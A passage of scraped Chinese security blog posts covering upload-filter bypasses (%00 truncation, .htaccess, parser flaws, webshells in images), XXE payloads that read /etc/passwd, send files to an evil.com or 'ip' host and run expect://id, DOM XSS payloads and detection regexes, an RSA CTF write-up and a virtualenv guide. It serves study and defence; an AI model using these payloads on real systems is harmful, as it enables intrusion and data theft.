客户端javascript检测通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测，例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。这类检测也是最容易绕过的检测，可以使用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交。使用burp，上传时提供一个白名单内的后缀，通过burp拦包，并修改后缀后提交 服务端检测绕过（MIME类型检测）12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //检测Content-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; 上面为php后端检测MIME类型的一个例子通过判断$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;来保证上传的类型为gif类型的文件。绕过这一类型的检测，可以通过burp拦包，将原Content-Type类型该为符合要求的image/gif类型。 服务端检测绕过（目录路劲检测）有一些web应用程序有多个文件夹用来存储图片文件，所以为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路劲。而此时如果对文件目录路劲检测不够完全，可以通过截断攻击。（如%00,windows下%80-%90）如上传时提供存储路劲为image/20160704/可以通过修改为image/20160704/evil.php%00来达到截断目的。后端程序会将该路劲连接为image/20160704/evil.php%00filename.gif00截断导致最终存储的文件名为evil.php 服务器端检测绕过（文件扩展名检测） 黑名单检测黑名单检测通常会有一个文件后缀名黑名单（例如html|htm|php|php2|php3|php4|php5…）但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单绕过的方法： 文件名大小写绕过（例如用Php，Asp等） 名单列表绕过(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀) 0x00截断（asp下可以尝试使用,asp为从后往前扫描扩展名，evil.asp%00.jpg，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过） 特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉） .htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测） .htaccess文件攻击如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果针对php，上传自定义.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件里面的内容是 php 一句话木马，通过菜刀连接可以解析php成因： 在 PHP manual 中提到了下面一段话 move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.’ 如果 PHP 安全没配置好 就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了 解析漏洞（apache解析漏洞，iis6.0解析漏洞，nginx解析漏洞） apache解析漏洞apache是从右到左开始判断解析，如果最右的后缀无法解析，则尝试解析后一个后缀 iis6.0解析漏洞 成因为iis6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型 还有一个为IIS6.0的00截断攻击 IIS6.0双文件上传 文件夹的名字包含.asp则这个文件夹下的文件都以asp的形式来解析 iis7.0/7.5解析漏洞对于php有一个类似Nginx的解析漏洞evil.jpg/evil.php 解析evil.jpg中的php代码，这个漏洞成因在于php-cgi的漏洞 nginx解析漏洞 将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，即evil.jpg/.php，evil.jpg会解析为php的格式 %00截断 其他方式提交前将filename=”evil.php”该为”evil.php”.jpg” 白名单检测 0x00截断绕过 解析漏洞绕过（文件名不被重写） 服务器端检测绕过（文件内容检测）图像类的文件内容检测 文件幻数检测（图片头格式检测）jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46gif内容头value= 47 49 46 38 39 61png内容头value= 89 50 4E 47 在文件头后加上一句话木马就能绕过 文件相关信息检测 图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) 文件加载检测 调用API或函数去进行文件加载测试，常见的是图像渲染测试，二次渲染，可以通过上传恶意文件，再下载下来，diff一下找到不变的位置插入一句话木马，但成功率不高 总结轻量级检测绕过攻击 绕过 javascript 对扩展名的检测 &lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt; 绕过服务端对 http request 包 MIME 类型检测 &lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt; 路径/扩展名检测绕过攻击 黑名单绕过 文件名大小写绕过 名单列表绕过 特殊文件名绕过 0x00 截断绕过 .htaccess 文件攻击 本地包含漏洞 Apache 解析漏洞 IIS 解析漏洞 Nginx 解析漏洞 白名单绕过 0x00 截断绕过 本地文件包含漏洞 IIS 解析漏洞 Nginx 解析漏洞 文件内容检测绕过攻击 文件加载测试绕过&lt;对文件进行代码注入再配合任意解析调用/漏洞&gt;"},{"title":"【VULNERABLITY】XML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-xxe/","text":"描述XML的一些基础知识，摘自security.tencent.comXML例子1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xml声明&lt;!DOCTYPE note[ 文档类型定义 &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; 文档元素&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; 上述为一个XML的实例DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 内部声明DTD&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;或者&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 内部声明实体&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 引用外部实体&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 漏洞描述摘自OWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. 漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 试验恶意引入外部实体方式： 本地文件读取 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; 远程文件读取 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;其中evil.dtd文件内容&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; 但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下ftp接受xxe数据不同的语言默认支持的协议不同 libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp 上述为默认支持协议，还可以通过扩展支持其他协议，如php scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 任意读取本地文件123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 不回显读取内容，远程传递数据1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);远程DTD文件内容&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 执行系统命令123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; 执行成功需要php的expect扩展 demo4 探测内网应用123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; 如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用同时如果找到了内容应用，可以通过这种方式攻击内网应用 防御方案一、使用开发语言提供的禁用外部实体的方法 PHP：libxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 方案二、过滤用户提交的XML数据关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。 json节点的Content-Type XXE攻击如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入Content-Type: application/json表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; 将如上的Content-Type改为xml格式的再发送123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; 如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... 但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息 带上一个xxe-cheat-sheet，DTD-Attacks参考security.tencent.com，91ri.org"},{"title":"【CTF】BCTF Crypto SpecialRSA writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"题目描述将附带的zip文件下载并解压。可以看到以下几个文件： 加密算法 示例密文 示例明文 加密的flag文件大致我们可以看出来，题目的意图为通过示例密明文，算出加密秘钥k，然后通过k解密flag文件。阅读加解密算法，我们可以得出以下的数学公式：12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N 已知2组(m,r,c) N 的值 求解k 到这里卡了很久，一直没个正确的方式来获取k，不用数学就会忘记啊啊啊啊啊啊啊。后来求组了老师，得到了一个思路。12345678910下面所有^-1表示对应的乘法逆元 假设gcd(r1,r2)=1,那么存在a,b使得公式r1*a+r2*b=1 那么 k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^b而k^rn 可以通过(m,r,c)对来获得这里直接使用encode公式c=[(k^r%N)*m]%N通过推导可以得出k^r=c*(m^-1)m的逆元可以通过扩展欧几里德算法来求得 有了上面的思路，就可以写程序来加解密了，这里我用了python来写，其中(m,r,c)对我事先拿出来了，清楚一点,下面的程序是来算k的123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' 扩展欧几里得算法 a*x + b*y = gcd(a,b) 返回 x,y以及a，b的最大公约数gcd :param a: :param b: :return:x,y以及a，b的最大公约数gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# 求逆元kr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k 通过上面的程序可以算出 k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L 接下来就简单了将k带入官方的算法就可以得到flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}上面程序中需要注意的是pow函数不支持指数为负数的情况，所以还要再转一下弯。 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-b所以可以先求出k^r mod N的逆元 总结数学方面的知识还是短板啊，以后得加强一下:)"},{"title":"【VULNERABLITY】DOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-DOM-XSS/","text":"引言 这几天阅读了《Web前端黑客技术揭秘》 ，对DOM型的XSS进行一个总结，内容主要为书中提到的知识点，整理整理作以后复习所用。 DOM类型的XSS与反射型、存储型XSS都不同，DOM型XSS不用服务器端解析响应的参与，触发DOM型XSS可以说主要依靠浏览器客户端的解析。常见的输出点见0x04附录。 DOM渲染 首先我们来理解一下HTML与Javascript自解码机制，查看以下三个例子123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; 对于第一种情况，很清楚，点击这个按钮后，会将&lt;img src=@ onerror=alert(123) /&gt;写入DOM中，并触发alert(123)。而第二种与第三种，document.write的内容都变成了&amp;lt;img src=@ onerror=alert(123) /&amp;gt;，区别在于一个是在HTML标签中,一个是通过Javascript处理后才变成这个样子的，那么这2种情况都会触发弹窗吗？答案是第二种不会，而第三种会触发。 形成这样的原因就是因为HTML与Javascript自解码机制，在HTML标签中的javascript可以进行HTML形式的编码。在HTML标签中的javascript代码会先被HTML形式的编码进行解码，即第三种情况中&amp;lt;img src=@ onerror=alert(123) /&amp;gt;在javascript运行前已经解码为&lt;img src=@ onerror=alert(123) /&gt;，而第二种情况为javascript运行中进行的HTML形式的编码，所以写到DOM中时直接显示在页面上。HTML中的编码： 进制编码：&#xH;(十六进制格式)、&#D;(十进制格式),最后的分号可以不要 HTML实体编码：即上面的那个HtmlEncode 那么同样的，在javascript上下文环境中，将内容改为javascript的编码，同样会自解码，我们来看下一个例子12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; 上面2中write出现的结果是相同的，同样的道理，由于上述编码为javascript的编码形式，并且在javascript的上下文环境中，会先进行解码，再运行javascript。JavaScript中的编码： Unicode形式：\\uH 普通十六进制：\\xH 纯转义：\\’、\\”、\\&lt;、>这样在特殊字符前加\\进行转义 通过上面几个例子，我们可以知道在HTML中与在Javascript中自动解码的差异，如果防御没有区分这样的场景，就会出现问题。 理解了上述的自解码机制，在不同的标签下会有不同的结果，比如一下几个标签会自带HtmlEncode功能12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;没有HtmlEncode功能，&lt;plaintext&gt;在Firefox下会进行HtmlEncode编码，在chrome下不会。 DOM fuzzing 直接看代码把 下面的程序用python编写123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;获取fuzzing的模板文件内容&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;生成fuzzing结果文件&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCII玛转换为字符 if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: #遍历这些字符 逐一生成fuzzing内容 fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) 下面为fuzz_xss_0.html的内容12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; 通过上面的fuzzing技巧，可以自行扩展 DOM XSS 挖掘 静态方法 静态方法查找危险关键字，可以使用下列正则表达式来匹配。123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ 详情可以看https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wiki一旦发现页面存在可疑特征，就进行人工分析，这是静态方法的代价，对人工参与要求很高 动态方法 动态方法相当于一次Javascript源码动态审计的过程。书中提到了两种思路123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; 就拿上面的例子来说，如何检测上面的DOM XSS 思路一 借用浏览器自身的动态性，可以写Firefox插件，批量对目标地址发起请求（一个模糊测试的过程），请求的形式为：在目标地址后加上#fuzzing内容，就当前这个例子来说。比如当前fuzzing内容为：var x=&#39;d0mx55&#39; 并且对常见的输出点函数进行劫持，如123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; 在javascript层面劫持innerHTML这样的属性已经没那么容易了，常用的属性劫持可以针对具体的对象设置__defineSetter__，比如下面的代码12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; 当x赋值的时候，就会触发事先定义好的Setter方法。innerHTML属性属于那些节点对象，想劫持具体节点对象的innerHTML，需要事先知道这个具体节点的对象，然后设置__defineSetter__,这样如果要检测DOM XSS，就要劫持所有的输出点，比较麻烦，那么思路二可能会比较简单一点 思路二 仍然借用浏览器动态执行的优势，写一个Firefox插件，我们完全以黑盒的方式进行模糊测试输入点，然后判断渲染后的DOM树中是否有我们期待的值，比如，模糊测试的内容都有如下一段代码document.write(&#39;d0m&#39;+&#39;x55&#39;)如果这段代码顺利执行了就会存在d0mx55文本节点，后续的检测工作只要判断是否存在这个文本节点就可以了123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; 这个思路以DOM树的改变为判断依据，简单准确，但是同样无法避免那些逻辑判断上导致的漏报。 附录 输出点 javascript code 直接输出HTML内容 document.write(…)document.writeln(…) document.body.innerHtml=… 直接修改DOM树（包括DHTML事件） document.forms[0].action=…document.attachEvent(…)document.create…(…)document.execCommand(…)document.body. …widow.attachEvent(…) 替换document url document.location=…(以及直接赋值给location的href,host,hostname属性)document.location.hostname=…document.location.replace(…)document.location.assign(…)documnent.URL=…window.navigate(…) 打开或修改新窗口 document.open(…)window.open(…)window.location.href=…(以及直接赋值给location的href,host,hostname属性) 直接执行脚本 eval(…)window.execScript(…)window.setInterval(…)window.setTimeout(…)"},{"title":"【OTHERS】flask virtualenv环境搭建","permalink":"http://blog.0kami.cn/2016/03/16/old-flask-virtualenv/","text":"引言python virtualenv为flask等web框架提供虚拟python环境（其他应用也可以），这样可以防止开发过程中安装的依赖影响原主机上的python环境，而且在迁移到上线环境中时，省去了配置上线环境中的python运行环境。 安装virtualenv 这里我推荐使用pip或者easy_install安装，同样也可以通过下载virtualenv.py来构建虚拟环境。 使用pip命令 pip install virtualenv 建立环境 首先进入网站的根目录（或者是任何需要建立虚拟环境的文件夹下） 使用dos命令 virtualenv venv 其中venv为python的虚拟环境，其中包括了python.exe、pip、easy_install等python环境。 激活环境 完成上一步后，接下来需要在dos界面激活虚拟环境，这样可以使得接下来下载的python模块都位于venv下的pip环境中Scripts\\activate 激活虚拟环境deactivate 退出虚拟环境 激活后命令行开头多了（venv），如下12E:\\code\\python-workplace\\flasker\\venv&gt;Scripts\\activate(venv) E:\\code\\python-workplace\\flasker\\venv&gt; 安装模块 在上面的基础下，通过pip install xxxx安装的模块都是安装在venv环境下的，对主机上的环境没有影响。 引入路径 在具体使用过程中，需要把venv的路径导入sys.path，这样才可以使用虚拟环境中的python模块。12importos,syssys.path.append(os.getcwd()+'\\\\venv\\\\Lib\\\\site-packages') 到这里就完成了python虚拟环境的搭建，总体对经常变动编程环境的城旭猿来说这是个非常有用功能。 ==The End=="}]}